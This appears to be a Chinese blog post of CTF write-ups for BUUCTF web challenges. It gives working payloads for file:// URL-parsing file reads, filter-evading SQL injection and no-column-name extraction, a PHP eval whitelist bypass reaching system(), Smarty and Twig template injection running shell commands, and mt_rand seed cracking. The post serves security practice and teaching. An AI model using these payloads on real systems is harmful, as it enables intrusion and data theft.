<p>nginx配置<br>配置文件存放目录：/etc/nginx<br>主配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>配置文件目录为：/usr/local/nginx/conf/nginx.conf</p>
</blockquote>
<p>首先不能让他为 suctf.cc，但是经过了 urlunsplit 后变成 suctf.cc，很容易就构造出：file:////suctf.cc/usr/local/nginx/conf/nginx.conf，这样就能读取nginx的配置文件了<br>读出配置文件中有usr/fffffflag<br>payload：<code>file:////suctf.cc/usr/fffffflag</code></p>
<p><img src="/2020/05/16/BUU-web5/1589417297060.png" alt="1589417297060"></p>
<h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>打开靶机是一个商店，需要我们购买Unicorn，但是价钱的地方只能输入一个字符</p>
<p><img src="/2020/05/16/BUU-web5/1589417919436.png" alt="1589417919436"></p>
<p>查看源码，在<a href="http://d.hatena.ne.jp/keyword/utf-8" target="_blank" rel="noopener">utf-8</a>旁边有一句提示：</p>
<blockquote>
<p>Ah,really important,seriously.</p>
</blockquote>
<p>发现就是<a href="http://d.hatena.ne.jp/keyword/utf-8" target="_blank" rel="noopener">utf-8</a>的编码转换问题。</p>
<p>在<a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">这个网站</a>查询<strong>thousand</strong><br>得到许多字符，随便挑，只要比1337大就可以</p>
<p>我选择了<a href="https://www.compart.com/en/unicode/U+1085F" target="_blank" rel="noopener">这个符号</a>，把0x换成%就可以了<br><img src="/2020/05/16/BUU-web5/1589418249241.png" alt="1589418249241"></p>
<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><p>打开靶机是一个登陆框，注册后登陆是一个发布广告的地方，随便输入一些字符，发布后点击查看广告详情发现报错，为二次注入<br><img src="/2020/05/16/BUU-web5/1589420089124.png" alt="1589420089124"></p>
<p>存在sql注入<br>过滤了order、by和空格<br>使用<code>union select</code>查看列数</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>'<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">21</span>,<span class="number">22</span>'</span><br></pre></td></tr></table></figure>

<p>有22列<br><img src="/2020/05/16/BUU-web5/1589423476236.png" alt="1589423476236"></p>
<p>查看数据库</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>'<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,database(),user(),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">21</span>,<span class="number">22</span>'</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589423527287.png" alt="1589423527287"></p>
<p>该数据库是马里奥数据库：<a href="https://mariadb.com/kb/en/library/mysqlinnodb_table_stats/" target="_blank" rel="noopener">https://mariadb.com/kb/en/library/mysqlinnodb_table_stats/</a><br>滤了information_schema,可以使用<code>**sys.schema_auto_increment_columns**</code>或者<code>mysql.innodb_table_stats</code>代替<br>其查表名的语句为</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(table_name)<span class="comment">/**/</span>from<span class="comment">/**/</span>mysql.innodb_table_stats),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>'</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(table_name)<span class="comment">/**/</span>from<span class="comment">/**/</span>sys.schema_auto_increment_columns<span class="comment">/**/</span>where<span class="comment">/**/</span>table_schema=schema()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,'<span class="number">22</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589423780836.png" alt="1589423780836"></p>
<p>但是不知道列名，使用无列名注入</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第二个字段</span><br><span class="line"><span class="number">-1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span>from(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span>as<span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select*from<span class="comment">/**/</span>users)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,'<span class="number">22</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589429462137.png" alt="1589429462137"></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第三个字段</span><br><span class="line"><span class="number">-1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(b)<span class="comment">/**/</span>from(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span>as<span class="comment">/**/</span>b<span class="comment">/**/</span>union<span class="comment">/**/</span>select*from<span class="comment">/**/</span>users)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,'<span class="number">22</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589429509486.png" alt="1589429509486"></p>
<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>先创建一个数据库和一个表，并插入一些数据</p>
<blockquote>
<p>create database testdb;</p>
<p>user testdb;</p>
<p>create table user(id int(10),user varchar(20),password varchar(30));</p>
<p>insert into user values(1,’admin’,’123456’),(2,’admin2’,’111111’);</p>
</blockquote>
<p><img src="/2020/05/16/BUU-web5/1589437665830.png" alt="1589437665830"></p>
<p>正常查询为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>

<p>使用联合查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589437970774.png" alt="1589437970774"></p>
<p>其中将列名被替换成了对应的数字，所以如果要查询password列的内容，直接用3代替即可</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`3`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>)a;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589438257604.png" alt="1589438257604"></p>
<blockquote>
<p>末尾的 a 可以是任意字符，用于命名。</p>
</blockquote>
<p>当然，多数情况下，<code>会被过滤。当</code> 不能使用的时候，使用别名来代替：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">as</span> b <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>)a;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589438303461.png" alt="1589438303461"></p>
<p>同时查询多个列：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">`2`</span>,<span class="number">0x2d</span>,<span class="string">`3`</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>)a <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589438533575.png" alt="1589438533575"></p>
<p>payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a,b <span class="keyword">from</span> posts <span class="keyword">where</span> a=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">`3`</span>,<span class="number">0x2d</span>,<span class="string">`4`</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> xxx)a <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<h1 id="CISCN-2019-Love-Math"><a href="#CISCN-2019-Love-Math" class="headerlink" title="[CISCN 2019 ]Love Math"></a>[CISCN 2019 ]Love Math</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>PHP函数：</strong></p>
<p>scandir() 函数：返回指定目录中的文件和目录的数组。<br>base_convert() 函数：在任意进制之间转换数字。<br>dechex() 函数：把十进制转换为十六进制。<br>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。<br>var_dump() ：函数用于输出变量的相关信息。<br>readfile() 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返                        回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该            函数，来隐藏错误信息。<br>语法：readfile(filename,include_path,context)</p>
</blockquote>
<p>首先是通过c进行get传参，不能包含blacklist里面的字符，并且不能有whitelist以外的字符<br>这里可以通过将函数名转为10进制，再通过白名单内的函数转回函数名，执行相应代码<br>payload:</p>
<blockquote>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"hex2bin"</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">"5f474554"</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$pi</span>=hex2bin("5f474554") =&gt; $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串</span></span><br><span class="line">(<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">abs</span>&#125;) =&gt; (<span class="symbol">$</span>_GET)&#123;<span class="built-in">pi</span>&#125;(<span class="symbol">$</span>_GET)&#123;<span class="built-in">abs</span>&#125;  <span class="comment">//&#123;&#125;可以代替[]</span></span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="literal">pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));($$<span class="literal">pi</span>)&#123;<span class="literal">pi</span>&#125;(($$<span class="literal">pi</span>)&#123;<span class="built_in">abs</span>&#125;)&amp;<span class="literal">pi</span>=system&amp;<span class="built_in">abs</span>=tac /<span class="built_in">flag</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/16/BUU-web5/1589442650477.png" alt="1589442650477"></p>
<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>hint页面查看源码<br><img src="/2020/05/16/BUU-web5/1589444923161.png" alt="1589444923161"></p>
<p>看见ip想到修改xff头</p>
<p>这里为一个模板注入</p>
<p><img src="/2020/05/16/BUU-web5/1589445294546.png" alt="1589445294546"></p>
<p>smarty模板注入payload</p>
<blockquote>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;X-Forwarded-<span class="keyword">For</span>: &#123;&#123;<span class="keyword">system</span>(<span class="string">"ls"</span>)&#125;&#125;</span><br><span class="line">&gt;X-Forwarded-<span class="keyword">For</span>: &#123;&#123;<span class="keyword">system</span>(<span class="string">"cat /flag"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/16/BUU-web5/1589445341991.png" alt="1589445341991"></p>
<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>hint页面查看源码<br><img src="/2020/05/16/BUU-web5/1589448078427.png" alt="1589448078427"></p>
<p>着手点在cookie，尝试是否存在模板注入，还是根据上面那张图</p>
<p><img src="/2020/05/16/BUU-web5/1589448279978.png" alt="1589448279978"></p>
<p>存在</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Twig </span><br><span class="line">&#123;&#123;<span class="number">7</span>*'<span class="number">7</span>'&#125;&#125; 输出<span class="number">49</span></span><br><span class="line">Jinja</span><br><span class="line">&#123;&#123;<span class="number">7</span>*'<span class="number">7</span>'&#125;&#125;输出<span class="number">7777777</span></span><br></pre></td></tr></table></figure>

<p>测试后为Twig模板注入<br>payload：</p>
<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"id"</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"cat /flag"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589448620761.png" alt="1589448620761"></p>
<h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><p>在网页源代码里面发现check.php，访问得到源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">HzWVFToCAC</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure>

<p>这个应该是伪随机数问题在MRCTF里面遇到过<code>MRCTF-Ezaudit</code><br>参考文章：</p>
<blockquote>
<p><a href="https://www.cnblogs.com/zaqzzz/p/9997855.html" target="_blank" rel="noopener">php伪随机数漏洞 以及脚本php_mt_seed的使用教程 - 冬泳怪鸽 - 博客园</a><br><a href="https://www.freebuf.com/vuls/192012.html" target="_blank" rel="noopener">PHP mt_rand安全杂谈及应用场景详解 - FreeBuf互联网安全新媒体平台</a></p>
</blockquote>
<p>先使用脚本将伪随机数转换成php_mt_seed可以识别的数据:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'HzWVFToCAC'</span></span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">43</span> <span class="number">43</span> <span class="number">0</span> <span class="number">61</span> <span class="number">25</span> <span class="number">25</span> <span class="number">0</span> <span class="number">61</span> <span class="number">58</span> <span class="number">58</span> <span class="number">0</span> <span class="number">61</span> <span class="number">57</span> <span class="number">57</span> <span class="number">0</span> <span class="number">61</span> <span class="number">41</span> <span class="number">41</span> <span class="number">0</span> <span class="number">61</span> <span class="number">55</span> <span class="number">55</span> <span class="number">0</span> <span class="number">61</span> <span class="number">14</span> <span class="number">14</span> <span class="number">0</span> <span class="number">61</span> <span class="number">38</span> <span class="number">38</span> <span class="number">0</span> <span class="number">61</span> <span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">38</span> <span class="number">38</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>

<p>在使用php_mt_seed去跑<br><img src="/2020/05/16/BUU-web5/1589511716452.png" alt="1589511716452"></p>
<p>再根据题目中的脚本将其转为字符串即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">198604756</span>);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里要在 php7.1+的环境里运行</p>
<p><img src="/2020/05/16/BUU-web5/1589512570530.png" alt="1589512570530"></p>
<p>提交得到flag<br><img src="/2020/05/16/BUU-web5/1589512914689.png" alt="1589512914689"></p>
